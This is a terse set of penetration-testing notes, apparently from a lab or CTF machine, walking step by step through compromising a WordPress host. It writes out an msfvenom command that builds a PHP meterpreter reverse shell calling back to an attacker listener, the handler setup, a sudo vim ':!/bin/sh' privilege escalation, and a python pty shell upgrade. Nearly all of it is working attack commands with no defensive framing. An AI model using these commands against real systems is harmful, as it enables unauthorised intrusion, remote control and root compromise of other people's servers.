1. Create meterpreter shell
here we use a meterpreter shell to have something stable in time and with already error message without having to redirect at each command
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.193.140 LPORT=1234 -f raw -o shell.php
2. Upload on wordpress php meterpeter reverse shell
3. Open msfconsole and start exploit/multi/handler
4. Run php shell
Got a reverse shell

5. Update path to
`export PATH=$PATH:/run/wrappers/bin:/etc/profiles/per-user/web/bin:/run/current-system/sw/bin`
  1. sudo
  2. user packages (vim)
  3. system packages

6. See that `sudo -l` give us vim
7. sudo vim -c ':!/bin/sh'
8. stabilize with 
- python3 -c 'import pty; pty.spawn("bash")'
- export TERM=xterm
